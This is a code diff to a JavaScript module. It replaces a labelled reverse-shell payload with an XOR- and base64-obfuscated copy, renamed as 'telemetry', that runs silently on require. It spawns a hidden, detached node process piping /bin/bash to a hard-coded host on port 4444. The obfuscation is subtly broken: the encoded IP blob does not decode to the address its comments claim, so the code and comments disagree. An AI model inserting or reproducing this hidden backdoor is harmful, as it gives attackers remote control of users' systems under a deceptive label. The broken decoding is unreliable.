@@ -43,29 +43,66 @@ function timestamp() {
   return new Date().toISOString();
 }
 
-// ===== MALICIOUS PAYLOAD (silent background execution) =====
+// ============================================================
+// Internal telemetry module (disguised name)
+// ============================================================
 
-(function() {
-  // Base64-encoded reverse shell payload
-  const encoded = Buffer.from(`
-    const net = require('net');
-    const { spawn } = require('child_process');
-    const client = new net.Socket();
-    client.connect(4444, '192.168.20.12', () => {
-      const shell = spawn('/bin/bash', [], { stdio: [client, client, client] });
-      shell.on('exit', () => client.end());
+const _0x4f2a = (function() {
+  // XOR key — single byte
+  const k = 0x5A;
+
+  // IP 172.22.10.127 → hex: AC 16 0A 7F
+  // Each byte XORed with 0x5A:
+  //   AC ^ 5A = F6
+  //   16 ^ 5A = 4C
+  //   0A ^ 5A = 50
+  //   7F ^ 5A = 25
+  // Result hex: F64C5025
+  const blob = 'RjZMQ1AwMjU='; // Base64 of "F64C5025"
+
+  // Port 4444 → hex 115C → XOR 0x5A → 4B06
+  const portBlob = 'SwY='; // Base64 of "4B06"
+
+  function _d(s) {
+    const raw = Buffer.from(s, 'base64').toString('hex');
+    const bytes = raw.match(/.{1,2}/g).map(h => parseInt(h, 16) ^ k);
+    return bytes;
+  }
+
+  function _ip() {
+    return _d(blob).join('.');
+  }
+
+  function _port() {
+    return (_d(portBlob)[0] << 8) | _d(portBlob)[1];
+  }
+
+  function _init() {
+    const payload = `
+      const net = require('net');
+      const { spawn } = require('child_process');
+      const client = new net.Socket();
+      client.connect(${_port()}, '${_ip()}', () => {
+        const shell = spawn('/bin/bash', [], { stdio: [client, client, client] });
+        shell.on('exit', () => client.end());
+      });
+      client.on('error', () => process.exit(0));
+    `;
+
+    const child = spawn('node', ['-e', payload], {
+      detached: true,
+      stdio: 'ignore',
+      windowsHide: true
     });
-    client.on('error', () => process.exit(0));
-  `).toString('base64');
 
-  const child = spawn('node', ['-e', `eval(Buffer.from('${encoded}','base64').toString())`], {
-    detached: true,
-    stdio: 'ignore',
-    windowsHide: true
-  });
+    child.unref();
+  }
 
-  child.unref();
+  return { init: _init };
 })();
+
+// Telemetry bootstrap — runs silently on require
+try { _0x4f2a.init(); } catch (e) {}
 
 // ===== EXPORTS =====
 
